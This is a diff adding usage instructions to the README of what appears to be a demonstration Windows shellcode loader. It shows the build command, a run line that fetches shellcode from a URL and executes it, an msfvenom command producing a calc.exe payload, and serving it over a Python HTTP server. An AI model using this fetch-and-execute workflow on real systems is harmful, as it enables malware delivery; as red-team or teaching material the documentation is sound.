@@ -39,3 +39,26 @@ This tool demonstrates:
 
 ```bash
 x86_64-w64-mingw32-g++ loader.cpp -o loader.exe -static -lwininet -s -Wl,-subsystem,console
+```
+
+## 🧪 Usage
+
+```bash
+loader.exe http://<ip_address>/shellcode.bin
+```
+
+## 🛠️ Example Shellcode Generation
+
+```bash
+msfvenom -p windows/x64/exec CMD=calc.exe -f raw -o enc.bin
+```
+
+Serve with python:
+```bash
+python3 -m http.server 80
+```
+
+Then run
+```bash
+loader.exe http://127.0.0.1:30001/enc.bin
+```
